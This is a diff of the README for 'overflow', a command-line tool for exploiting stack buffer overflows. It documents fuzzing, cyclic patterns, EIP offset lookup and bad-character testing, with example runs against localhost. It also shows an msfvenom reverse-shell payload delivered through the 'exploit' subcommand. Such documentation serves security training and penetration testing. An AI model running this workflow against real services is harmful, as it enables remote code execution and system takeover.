@@ -54,9 +54,9 @@ $ overflow help
 $ overflow (fuzz | pattern | chars | exploit) --help
 ```
 
-The required flags for every subcommand are "host" and "port". You can also
-specify any prefixes or suffixes to put before and after the payload, in the
-case that a menu or something is presented to you when you open the socket.
+The required flags for (almost) every subcommand are "host" and "port". You can
+also specify any prefixes or suffixes to put before and after the payload, in
+the case that a menu or something is presented to you when you open the socket.
 
 ### Fuzzing for Buffer Length
 Possibly the most important step in buffer overflow exploitation is finding the
@@ -71,6 +71,9 @@ The required flags are "host", "port" and "step".
 ```
 $ overflow fuzz (-H|--host HOST) (-P|--port PORT) (-S|--step STEP) [flags]
 ```
+
+Take a look at [Fuzzing for Buffer Length](#example-fuzz) for a more detailed
+example.
 
 ### Sending Cyclic Patterns
 Why would you want to do this? Well, sending a cyclic pattern of bytes to the
@@ -87,6 +90,24 @@ The required flags are "host", "port" and "length".
 $ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
 ```
 
+Take a look at [Sending Cyclic Patterns](#example-pattern) for a more detailed
+example.
+
+### Getting the Offset from a Cyclic Pattern
+The next step after sending the cyclic pattern to the target service is using
+that pattern to find the various offsets to particular registers (one important
+register would be EIP). All we would have to do is pass value of the bytes that
+overwrote the register to the `offset` subcommand, and we would get the offset
+of that register.
+
+The only required flag is "query".
+```
+$ overflow offset (-q|--query QUERY) [flags]
+```
+
+Take a look at [Getting the Offset from a Cyclic Pattern](#example-offset) for
+a more detailed example.
+
 ### Sending Bad Characters
 An important part of buffer overflow exploitation is determining which
 characters are "bad", or which characters are treated differently by the target
@@ -101,6 +122,9 @@ Required flags are "host", "port" and "offset".
 $ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
 ```
 
+Take a look at [Sending Bad Characters](#example-chars) for a more detailed
+example.
+
 ### Running Exploits
 Once you've found the offset of the EIP register, and a valid jump address, you
 can execute shellcode on the target service. The `exploit` subcommand provides
@@ -113,9 +137,12 @@ $ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
     (-j|--jump JUMP) (-S|--shell SHELL) [flags]
 ```
 
+Take a look at [Running Exploits](#example-exploit) for a more detailed
+example.
+
 ## Examples
 
-### Fuzzing for Buffer Length
+### Fuzzing for Buffer Length <a name="example-fuzz"></a>
 Here's a quick example using this subcommand to fuzz for the length of the
 target buffer in 100-byte steps.
 ```
@@ -133,7 +160,7 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
       \ \_\   \ \_____\\ \_____\\ \__/".~\_\
        \/_/    \/_____/ \/_____/ \/_/   \/_/
 
-        v1.1.1
+        v1.2.0
 
  by Stephen Radley             github.com/sradley
 ──────────────────────────────────────────────────
@@ -157,7 +184,7 @@ $ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
  Success! Length of buffer is in range (400, 500].
 ```
 
-### Sending Cyclic patterns
+### Sending Cyclic patterns <a name="example-pattern"></a>
 Here's a quick example using this subcommand to send a 60-byte cyclic pattern
 to the target service.
 ```
@@ -175,7 +202,7 @@ $ overflow pattern -H 127.0.0.1 -P 4444 -l 65
       \ \_\   \ \_____\\ \_____\\ \__/".~\_\
        \/_/    \/_____/ \/_____/ \/_/   \/_/
 
-        v1.1.1
+        v1.2.0
 
  by Stephen Radley             github.com/sradley
 ──────────────────────────────────────────────────
@@ -198,7 +225,42 @@ Connection from 127.0.0.1:48870
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
 ```
 
-### Sending Bad Characters
+### Getting the Offset from a Cyclic Pattern <a name="example-offset"></a>
+Here's a quick example as to how you'd use the `offset` subcommand to find the
+location of a particular sub-pattern.
+
+Note that I'm using the `reverse` flag to let it know that the target system is
+little-endian so the bytes in the sub-pattern must be reversed.
+```
+$ overflow offset -rq "\x38\x6f\x43\x37"
+```
+```
+  ______   __   __ ______   ______
+ /\  __ \ /\ \ / //\  ___\ /\  == \
+ \ \ \/\ \\ \ \'/ \ \  __\ \ \  __< 
+  \ \_____\\ \__|  \ \_____\\ \_\ \_\
+   \/_____/ \/_/    \/_____/ \/_/ /_/
+      ______  __       ______   __     __
+     /\  ___\/\ \     /\  __ \ /\ \  _ \ \
+     \ \  __\\ \ \____\ \ \/\ \\ \ \/ ".\ \
+      \ \_\   \ \_____\\ \_____\\ \__/".~\_\
+       \/_/    \/_____/ \/_____/ \/_/   \/_/
+
+        v1.2.0
+
+ by Stephen Radley             github.com/sradley
+──────────────────────────────────────────────────
+ :: Query       : "\x38\x6f\x43\x37"
+ :: Reverse     : true
+ :: Length      : 0
+──────────────────────────────────────────────────
+ > Parsing query.
+ > Searching for query within pattern.
+
+ Success! Pattern offset is: 2003
+ ```
+
+### Sending Bad Characters <a name="example-chars"></a>
 Here's an example showing the use of this subcommand. Make sure you include the
 offset to the EIP register.
 ```
@@ -216,7 +278,7 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160
       \ \_\   \ \_____\\ \_____\\ \__/".~\_\
        \/_/    \/_____/ \/_____/ \/_/   \/_/
 
-        v1.1.1
+        v1.2.0
 
  by Stephen Radley             github.com/sradley
 ──────────────────────────────────────────────────
@@ -251,7 +313,7 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
       \ \_\   \ \_____\\ \_____\\ \__/".~\_\
        \/_/    \/_____/ \/_____/ \/_/   \/_/
 
-        v1.1.1
+        v1.2.0
 
  by Stephen Radley             github.com/sradley
 ──────────────────────────────────────────────────
@@ -269,7 +331,7 @@ $ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
  Success! No errors found.
 ```
 
-### Running Exploits
+### Running Exploits <a name="example-exploit"></a>
 Here's a brief example explaining how you can use the `exploit` subcommand to
 execute a payload generated by `msfvenom`.
 
@@ -280,10 +342,7 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
 ```
 
 Then just use the tool as follows, ensuring you include the offset to the EIP
-register and the jump address in the format used below. Don't forget that if
-the target system is little-endian you need to write the jump address
-backwards (e.g. if the address is "\x01\x02\x03\x04", write it as
-"\x04\x03\x02\x01").
+register and the jump address in the format used in the example below.
 ```
 $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/payload.shell
 ```
@@ -299,7 +358,7 @@ $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/
       \ \_\   \ \_____\\ \_____\\ \__/".~\_\
        \/_/    \/_____/ \/_____/ \/_/   \/_/
 
-        v1.1.1
+        v1.2.0
 
  by Stephen Radley             github.com/sradley
 ──────────────────────────────────────────────────
@@ -308,6 +367,7 @@ $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/
  :: Port        : 4444
  :: Offset      : 160
  :: Jump        : "\x5f\x4a\x35\x8f"
+ :: Reverse     : false
  :: NOPs        : 16
  :: Shell       : payload.shell
 ──────────────────────────────────────────────────
@@ -318,3 +378,11 @@ $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/
  
  Success! No errors found.
 ```
+
+Don't forget that if the target system is little-endian you need to write the
+jump address backwards (e.g. if the address is "\x01\x02\x03\x04", write it as
+"\x04\x03\x02\x01"). Alternatively, you can just specify the "reverse" flag.
+```
+$ overflow exploit ... -rj "\x01\x02\x03\x04" ...
+```
+
